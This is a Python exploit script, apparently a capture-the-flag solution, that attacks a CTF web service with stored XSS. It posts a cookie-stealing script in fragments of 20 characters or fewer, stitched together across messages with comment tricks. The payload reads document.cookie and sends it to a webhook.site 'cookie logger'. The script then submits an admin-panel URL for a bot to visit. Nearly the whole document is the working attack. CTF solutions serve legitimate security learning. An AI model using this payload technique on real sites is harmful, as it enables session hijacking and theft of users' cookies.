import requests
import asyncio
import hashlib

# stored XSS + dangling markup injection

async def main():
    target_url = "http://callback-2.ctf.maplebacon.org"
    exfil_url = "http://webhook.site/XXXXXXXX-YYYY-XXXX-YYYY-XXXXXXXXXXXX" # cookie logger
    MAX_CHARS = 5
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    # split exfil_url into chunks of 5
    chunks = [exfil_url[i:i+MAX_CHARS] for i in range(0, len(exfil_url), MAX_CHARS)]
    print(len(chunks))
    # temp. store strings and concatenate them into a single fetchable URL
    chunks = [f"""*/let {alphabet[i]} = "{c}";/*""" for i, c in enumerate(chunks)]
    s = requests.Session()
    fragments = [
        f"""<script>/*""",
        *chunks,
        "*/let x ='';/*",
        "*/x += a+b+c+d+e;/*",
        "*/x += f+g+h+i+j;/*",
        "*/x += k+l;/*",
        "*/d = document;/*",
        "*/c = d['cookie'];/*",
        """*/x += "?c="+c;/*""",
        """*/fetch(x);/*""",
        f"""*/</script>""",
    ]
    for fragment in fragments:
        assert(len(fragment) <= 20)
        
    name = "myrandomname"
    for fragment in fragments:
        r = s.post(f"{target_url}/leave-message", data={"name": name, "phone": "111-111", "message": fragment})
    r = s.post(f"{target_url}/report", data={"url": f"http://localhost:1337/admin-panel?key={hashlib.sha1(bytes(name,'utf-8')).hexdigest()}"})
    print(r.text)

if __name__ == '__main__':
    asyncio.run(main())
